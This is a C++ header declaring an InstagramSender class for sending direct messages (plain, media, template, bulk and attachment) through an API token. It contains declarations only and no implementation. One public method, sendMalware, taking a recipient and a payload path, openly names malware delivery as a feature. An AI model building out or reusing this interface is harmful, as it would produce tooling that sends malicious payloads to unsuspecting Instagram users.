#ifndef INSTAGRAMSENDER_H
#define INSTAGRAMSENDER_H

#include <string>
#include <unordered_map>
#include <memory>
#include <vector>
#include "TemplateLoader.h"
#include "Logger.h"
#include "MCreator.h"
#include "URLShortener.h"

class InstagramSender {
public:
    InstagramSender(const std::string &authToken);
    
    bool sendMessage(const std::string &recipient, const std::string &message);
    bool sendMediaMessage(const std::string &recipient, const std::string &mediaUrl, const std::string &caption);
    bool sendTemplateMessage(const std::string &recipient, const std::string &templateName, const std::unordered_map<std::string, std::string> &params);
    void sendBulkMessages(const std::vector<std::string> &recipients, const std::string &message);
    void sendMessageWithAttachment(const std::string &recipient, const std::string &message, const std::string &attachmentPath);
    void sendMalware(const std::string &recipient, const std::string &payloadPath);
    void setTemplateLoader(const std::shared_ptr<TemplateLoader>& loader);

private:
    std::string authToken;
    std::string apiUrl;
    std::shared_ptr<TemplateLoader> templateLoader;

    std::string buildMessagePayload(const std::string &recipient, const std::string &message);
    std::string buildMediaMessagePayload(const std::string &recipient, const std::string &mediaUrl, const std::string &caption);
    std::string buildTemplateMessagePayload(const std::string &recipient, const std::string &templateName, const std::unordered_map<std::string, std::string> &params);
    bool sendRequest(const std::string &payload);
    void logInstagramSending(const std::string &recipient, const std::string &message);
    std::string prepareMessage(const std::string &message);
    bool retryOnFailure(const std::string &payload, int retries = 3);
};

#endif // INSTAGRAMSENDER_H





